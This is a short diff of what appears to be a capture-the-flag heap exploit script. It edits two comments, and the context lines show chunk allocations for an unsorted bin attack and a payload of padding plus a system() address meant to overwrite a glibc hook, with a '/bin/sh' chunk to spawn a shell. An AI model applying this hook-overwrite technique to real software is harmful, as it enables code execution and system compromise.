@@ -50,7 +50,7 @@ add(0x100, payload, "color2")
 add(0x28, "\n", "color3")
 # need to setup now
 # because after unsorted bin attack, we can not malloc these chunk
-# because fastbin empty and unsorted bin being corrupted
+# because fastbin is empty and unsorted bin being corrupted
 # 4
 add(0x60, "\n", "color4")
 # 5
@@ -159,7 +159,7 @@ add(0x60, name, "color5")
 add(0x60, "/bin/sh", "color6")
 # 6
 add(0x60, "\n", "color7")
-# overwrite malloc_hook by system
+# overwrite free_hook by system
 # 7
 payload = "\x00"*0x33 + p64(sys_addr)
 add(0x60, payload, "color7")
